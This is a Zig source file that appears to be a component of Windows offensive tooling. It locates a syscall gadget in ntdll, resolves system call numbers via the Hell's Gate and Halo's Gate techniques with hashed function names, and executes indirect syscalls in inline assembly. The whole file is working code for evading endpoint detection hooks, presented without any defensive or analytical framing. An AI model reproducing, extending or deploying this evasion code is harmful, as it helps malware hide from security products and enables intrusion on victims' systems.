const std = @import("std");
const api = @import("api.zig");
const crypto = @import("crypto.zig");

pub const SYSCALL_STUB = struct {
    ssn: u32,
    address: usize,
};

pub var syscall_gadget: usize = 0;

/// Finds a legitimate 'syscall; ret' gadget in ntdll.dll
pub fn findSyscallGadget(ntdll_base: *anyopaque) !usize {
    const base: [*]u8 = @ptrCast(ntdll_base);
    const dos_header: *api.IMAGE_DOS_HEADER = @ptrCast(@alignCast(base));
    const nt_headers: *api.IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(base + dos_header.e_lfanew));

    // Scan the .text section (usually the first section)
    const section_header_ptr = @as([*]api.IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(nt_headers) + @sizeOf(api.IMAGE_NT_HEADERS64)));
    var i: u16 = 0;
    while (i < nt_headers.FileHeader.NumberOfSections) : (i += 1) {
        const section = section_header_ptr[i];
        if (std.mem.startsWith(u8, &section.Name, ".text")) {
            const start = base + section.VirtualAddress;
            const end = start + section.VirtualSize;
            var ptr = start;
            while (@intFromPtr(ptr) < @intFromPtr(end) - 3) : (ptr += 1) {
                // 0F 05 C3 -> syscall; ret
                if (ptr[0] == 0x0F and ptr[1] == 0x05 and ptr[2] == 0xC3) {
                    return @intFromPtr(ptr);
                }
            }
        }
    }
    return error.GadgetNotFound;
}

pub fn getSsn(ntdll_base: *anyopaque, func_hash: u32) !u32 {
    const base: [*]u8 = @ptrCast(ntdll_base);
    const dos_header: *api.IMAGE_DOS_HEADER = @ptrCast(@alignCast(base));
    const nt_headers: *api.IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(base + dos_header.e_lfanew));
    const export_dir_rva = nt_headers.OptionalHeader.DataDirectory[0].VirtualAddress;
    const export_dir: *api.IMAGE_EXPORT_DIRECTORY = @ptrCast(@alignCast(base + export_dir_rva));

    const names: [*]u32 = @ptrCast(@alignCast(base + export_dir.AddressOfNames));
    const ordinals: [*]u16 = @ptrCast(@alignCast(base + export_dir.AddressOfNameOrdinals));
    const functions: [*]u32 = @ptrCast(@alignCast(base + export_dir.AddressOfFunctions));

    var i: u32 = 0;
    while (i < export_dir.NumberOfNames) : (i += 1) {
        const name_ptr: [*]u8 = @ptrCast(base + names[i]);
        var name_len: usize = 0;
        while (name_ptr[name_len] != 0) : (name_len += 1) {}

        if (crypto.djb2(name_ptr[0..name_len]) == func_hash) {
            const addr = base + functions[ordinals[i]];

            // Hell's Gate: Check if clean
            if (addr[0] == 0x4C and addr[1] == 0x8B and addr[2] == 0xD1 and addr[3] == 0xB8) {
                return @as(u32, @intCast(addr[4])) | (@as(u32, @intCast(addr[5])) << 8);
            }

            // Halo's Gate: Scan neighbors (up to 32 slots)
            var offset: i32 = 1;
            while (offset < 32) : (offset += 1) {
                // Check neighbor above
                const up = addr + @as(usize, @intCast(offset * 32));
                if (up[0] == 0x4C and up[1] == 0x8B and up[2] == 0xD1 and up[3] == 0xB8) {
                    const ssn = @as(u32, @intCast(up[4])) | (@as(u32, @intCast(up[5])) << 8);
                    return ssn - @as(u32, @intCast(offset));
                }
                // Check neighbor below
                const down = addr - @as(usize, @intCast(offset * 32));
                if (down[0] == 0x4C and down[1] == 0x8B and down[2] == 0xD1 and down[3] == 0xB8) {
                    const ssn = @as(u32, @intCast(down[4])) | (@as(u32, @intCast(down[5])) << 8);
                    return ssn + @as(u32, @intCast(offset));
                }
            }
            return error.SsnNotFound;
        }
    }
    return error.FunctionNotFound;
}

/// Executes an indirect syscall.
/// SSN in EAX, R10 = RCX (per Windows convention), then jump to gadget.
/// Supports up to 11 arguments for complex syscalls.
pub fn doSyscall(ssn: u32, gadget: usize, args: []const usize) u32 {
    var result: u32 = 0;
    
    // Safety Wrapper: Unconditionally zero-pad arguments to 12 elements.
    // This prevents the assembly block from reading past the end of the provided slice
    // when executing syscalls with fewer than 12 parameters.
    var safe_args = [_]usize{0} ** 12;
    const len = if (args.len > 12) 12 else args.len;
    for (0..len) |i| {
        safe_args[i] = args[i];
    }
    const ptr = &safe_args;

    asm volatile (
        \\ pushq %%rsi
        \\ pushq %%rbx
        \\ pushq %%r15
        \\
        \\ movq %%rsp, %%r15        # Save RSP
        \\
        \\ andq $-16, %%rsp         # Align stack to 16 bytes
        \\ subq $112, %%rsp         # 32 (shadow) + 80 (args)
        \\
        \\ # Load stack arguments using RSI (forced by constraint)
        \\ movq 32(%%rsi), %%r11; movq %%r11, 32(%%rsp)
        \\ movq 40(%%rsi), %%r11; movq %%r11, 40(%%rsp)
        \\ movq 48(%%rsi), %%r11; movq %%r11, 48(%%rsp)
        \\ movq 56(%%rsi), %%r11; movq %%r11, 56(%%rsp)
        \\ movq 64(%%rsi), %%r11; movq %%r11, 64(%%rsp)
        \\ movq 72(%%rsi), %%r11; movq %%r11, 72(%%rsp)
        \\ movq 80(%%rsi), %%r11; movq %%r11, 80(%%rsp)
        \\ movq 88(%%rsi), %%r11; movq %%r11, 88(%%rsp)
        \\
        \\ # Load register arguments using RSI
        \\ movq 0(%%rsi), %%r10     # arg1 -> R10
        \\ movq 8(%%rsi), %%rdx     # arg2 -> RDX
        \\ movq 16(%%rsi), %%r8      # arg3 -> R8
        \\ movq 24(%%rsi), %%r9      # arg4 -> R9
        \\
        \\ # EAX has SSN (forced by constraint)
        \\ # RBX has gadget (forced by constraint)
        \\
        \\ callq *%%rbx             # Indirect syscall via gadget
        \\
        \\ movq %%r15, %%rsp        # Restore RSP
        \\ popq %%r15
        \\ popq %%rbx
        \\ popq %%rsi
        : [ret] "={eax}" (result)
        : [ssn] "{eax}" (ssn),
          [ptr] "{rsi}" (ptr),
          [gadget] "{rbx}" (gadget)
    );
    return result;
}
